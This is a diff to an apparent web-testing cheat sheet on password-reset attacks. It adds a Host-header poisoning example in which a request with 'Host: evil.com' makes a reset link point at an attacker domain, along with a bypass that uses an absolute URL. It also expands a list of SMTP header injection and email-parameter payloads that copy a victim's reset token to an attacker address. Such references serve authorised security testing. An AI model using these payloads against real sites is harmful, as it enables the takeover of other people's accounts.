@@ -13,7 +13,7 @@
 - Intercept the request and add some headers with attacker control domain.
 - Check email and see if password token comes with attacker control domain.
 ```
-##### Headers
+#### Password Reset Poisoning
 Try to change Host header.
 ```
 Host: evil.com
@@ -60,6 +60,26 @@ Host: evil.com%00vulernable-website.com
 ```
 
 ```
+Request:
+POST /password-reset?user=123 HTTP/1.1
+Host: evil.com
+
+Link received:
+none
+
+Error 404 - request blocked
+
+Bypass technique:
+Request:
+POST https://target.com/password-reset?user=123 HTTP/1.1
+Host: evil.com
+
+Link received:
+https://evil.com/reset-link=1g2f3guy23g
+```
+
+
+```
 - Click forgot passowrd and enter attacker email.
 - Intercept the response (Action > Do intercept > Response to this request) and looking for password reset token or code.
 - If found, then do the same procedure for victim email. 
@@ -99,17 +119,19 @@ Sometime web app doesn't care about email. User can create more than one account
 
 #### SMTP Header Injection & Email Parameter Manipulation
 ```
-victim@mail.tld%0d%0acc:attacker@mail.tld
+email=victim@email
+email=victim
+email=victim@mail.tld%0d%0acc%3aattacker@mail.tld
 
-victim@mail.tld%0d%0abcc:attacker@mail.tld
+email=victim@mail.tld%0d%0abcc%3aattacker@mail.tld
+
+email=victim@email.tld%3aattacker@email.tld
 
 email=victim@email.tld%20email=attacker@email.tld
 
 email=victim@email.tld|email=attacker@email.tld
 
 email="victim@mail.tld",email="attacker@mail.tld"
-
-email=victim@email.tld:attacker@email.tld
 
 {"email":["victim@email.tld","atracker@email.tld"]}
 ```
